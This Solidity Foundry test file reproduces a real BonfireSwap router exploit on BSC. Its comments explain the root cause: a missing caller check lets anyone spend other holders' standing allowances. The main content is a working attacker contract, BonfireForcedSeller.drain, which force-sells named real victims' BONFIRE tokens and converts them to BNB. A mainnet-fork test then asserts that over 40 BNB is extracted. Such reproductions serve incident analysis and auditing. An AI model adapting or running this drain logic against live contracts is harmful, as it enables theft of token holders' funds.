// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// BonfireSwap router - arbitrary-"from" force-sell via a missing caller check on transfer(). BSC.
// transfer(to, amountAIn, beneficiary, deadline) pulls `to`'s BONFIRE using ONLY the standing
// allowance `to` granted the router (from prior legitimate use) - there is no msg.sender==to check -
// and the router's own skim hands those tokens to the attacker, who then sells them for BNB.
// Reported loss ~66 BNB (~$47-50K).
//
// Attack tx       : 0xb4c00e8f3ba815b6c70f45026f8794d2c1f079646a89919077688ce60692193f (block 122003954)
// Attacker EOA    : 0x2B5bF7D9D9Dc1EEc68f40C6B7a8f197e65f9731a
// Attack contract : 0x28E976Ea7b83553d6D1D45CE81334156A2632127
// BonfireSwap      : 0x17e801E17CeFC6334059189c178D4783830E03D3 (verified)
// BONFIRE token    : 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590 (10% tax / 5% reflection, 5,000 maxTx)
// Pancake pair     : 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2 (token0 = BONFIRE, token1 = WBNB)
// WBNB             : 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
//
// ROOT CAUSE (verified against the verified source):
//   function transfer(address to, uint amountAIn, address beneficiary, uint deadline) public ensure(deadline) {
//       _safeTransferFrom(tokenAddress, to, pancakePair, amountAIn);   // TOKEN.transferFrom(to, pair, amt)
//       (amountAOut, amountBOut) = skimPools(beneficiary);
//   }
//   _safeTransferFrom does token.call(transferFrom(from=to, pair, amount)) with NO require(msg.sender == to)
//   and NO check the caller has any allowance from `to`. The pull succeeds purely on the allowance `to`
//   itself granted the router earlier. simpleTransfer() and loggedTransfer() share the identical
//   _safeTransferFrom(tokenAddress, to, ...) pattern and are equally exploitable; the real attack used the
//   plain transfer() path.
//
// HOW THE PROCEEDS ARE REALIZED (reconciled against the real trace - the alert's skimPool framing is off):
//   The pancake pair IS the router's pools[0]. So the skimPools() inside transfer() skims the freshly
//   dumped excess straight back out to `beneficiary` AS BONFIRE (not WBNB). Each transfer() therefore
//   deposits the victim's tokens into the attacker's contract. The standalone skimPool(pair, ...) the
//   attacker also emits is wrapped in try/catch and simply reverts (INSUFFICIENT_OUTPUT once potential==0),
//   so it is NOT how value is realized. The attacker monetizes by then calling the router's own
//   sell() on the accumulated BONFIRE: in-trace two sell()s returned 33.22 + 32.86 = 66.08 WBNB.
//
// VICTIMS (from the tx's real TOKEN logs): 67 distinct senders dumped into the pair, but that count
//   includes the attack contract (0x28E9..2127) and the token contract itself (0x5e90..5590) doing
//   reflection/tax bookkeeping - so the real external-holder victim set is ~65, of which ~41 carried a
//   drained-worthy balance: the 65-vs-41 spread. Largest victim 0xefF2FC4E..4096 lost 5,289.10 TOKEN,
//   matching the alert. Across all 61 skim-refunds the attacker collected 5,082.49 BONFIRE.
//
// This PoC reconstructs the 5 largest REAL victims using their REAL on-chain state read live from the
// fork (each has an unlimited standing allowance to the router; drain sizes are the real in-trace
// amounts). Those 5 account for ~5,017 of the 5,082 BONFIRE collected == ~98.7% of the drain, so the
// reproduced BNB is a ~99% share of the ~66 BNB total (see the assertion).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IBonfireSwap {
    // real signatures; no return declared so we don't depend on decoding their tuple returns.
    function transfer(address to, uint256 amountAIn, address beneficiary, uint256 deadline) external;
    function sell(uint256 amountAIn, uint256 minAmountOut, address to, uint256 deadline) external;
}

/// @notice Named attacker. Unprivileged - every call is one any address can make.
contract BonfireForcedSeller {
    IBonfireSwap constant ROUTER = IBonfireSwap(0x17e801E17CeFC6334059189c178D4783830E03D3);
    IERC20 constant TOKEN = IERC20(0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590);
    uint256 constant MAX_TX = 2450e18; // stay under the token's 5,000 maxTx cap per sell (real chunks ~2,479)

    receive() external payable {}

    /// @dev Step 1: force-sell each named holder's BONFIRE using THEIR standing allowance to the router;
    ///      the router's skim refunds the tokens to this contract. Step 2: dump the collected BONFIRE
    ///      through the router's sell() for BNB.
    function drain(address[] calldata victims, uint256[] calldata amounts) external returns (uint256 bnbGained) {
        uint256 startBal = address(this).balance;

        // Step 1 - collect victims' tokens into this contract (beneficiary == this).
        for (uint256 i = 0; i < victims.length; i++) {
            require(amounts[i] <= TOKEN.balanceOf(victims[i]), "amount exceeds real balance");
            ROUTER.transfer(victims[i], amounts[i], address(this), block.timestamp);
        }

        // Step 2 - sell the accumulated BONFIRE for BNB, chunked under the maxTx cap.
        TOKEN.approve(address(ROUTER), type(uint256).max);
        for (uint256 k = 0; k < 8; k++) {
            uint256 bal = TOKEN.balanceOf(address(this));
            if (bal < 1e18) break;
            uint256 chunk = bal > MAX_TX ? MAX_TX : bal;
            uint256 bnbBefore = address(this).balance;
            ROUTER.sell(chunk, 0, address(this), block.timestamp);
            if (address(this).balance == bnbBefore) break; // no proceeds -> stop
        }

        bnbGained = address(this).balance - startBal;
    }
}

contract BonfireSwap_exp is Test {
    address constant ROUTER = 0x17e801E17CeFC6334059189c178D4783830E03D3;
    IERC20 constant TOKEN = IERC20(0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590);

    BonfireForcedSeller attacker;
    address attackerEOA = makeAddr("attackerEOA");

    // The exact real drain sequence for the 5 largest victims (~98.7% of the drain). The top victim
    // exceeds the 5,000 maxTx cap, so - as in the real tx - it is pulled in two sub-cap chunks.
    function _sequence() internal pure returns (address[] memory calls, uint256[] memory amounts) {
        calls = new address[](6);
        amounts = new uint256[](6);
        calls[0] = 0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096; amounts[0] = 2644176000944142651753;
        calls[1] = 0xefF2FC4E3145f58F534d68A36Bcd3085Be6a4096; amounts[1] = 2644928766184339197335;
        calls[2] = 0xB5FA67EaA51b82dcf807021714af6E9469a8C60a; amounts[2] = 35793541251552693748;
        calls[3] = 0x0e209754d8Ad3d277f94288a5FC10854e11e9636; amounts[3] = 8914921028910356181;
        calls[4] = 0x7a8A1060CC281D0263Dc45B0ff5B98a6cD3b9Acd; amounts[4] = 8879656371956250055;
        calls[5] = 0x1Aa7202824a667783Be76b64d4d38a74a322f604; amounts[5] = 8844138239216892382;
    }

    function setUp() public {
        vm.createSelectFork("bsc", 122003953); // parent of the attack block
        attacker = new BonfireForcedSeller();
    }

    function testExploit() public {
        (address[] memory calls, uint256[] memory amounts) = _sequence();

        // Precondition on real state: each named holder granted the router a standing allowance (from
        // prior legitimate use) that the attacker - not the holder - is about to spend. None is the caller.
        for (uint256 i = 0; i < calls.length; i++) {
            assertGt(TOKEN.allowance(calls[i], ROUTER), 0, "victim has standing allowance to router");
            assertTrue(calls[i] != address(attacker) && calls[i] != attackerEOA, "victim != attacker");
        }

        vm.prank(attackerEOA, attackerEOA);
        uint256 gained = attacker.drain(calls, amounts);

        emit log_named_decimal_uint("BNB extracted (5-victim subset ~98.7% of drain)", gained, 18);
        // Full incident ~66 BNB. This subset is ~98.7% of the collected BONFIRE, so it reproduces a
        // large majority of the total; assert a conservative floor well above half of 66 BNB.
        assertGt(gained, 40 ether, "attacker realized the bulk of the ~66 BNB");
    }
}
